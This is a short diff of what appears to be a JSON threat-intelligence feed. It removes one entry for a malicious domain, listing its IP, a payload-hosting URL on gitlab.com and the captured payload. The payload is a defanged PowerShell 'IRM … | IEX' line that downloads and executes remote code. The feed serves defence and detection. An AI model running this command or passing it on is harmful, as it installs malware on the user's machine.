@@ -1937,25 +1937,5 @@
     ],
     "ReportId": "cmwm7i18s1sda0omler9ihr8u",
     "ScannedAt": "2026-11-18T14:18:19.279000+00:00"
-  },
-  {
-    "UrlDomain": "pterygiumhouston.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "192.254.188.210"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwm6nfdo1scb0omllphe87cz",
-    "ScannedAt": "2026-11-18T13:54:31.270000+00:00"
   }
 ]
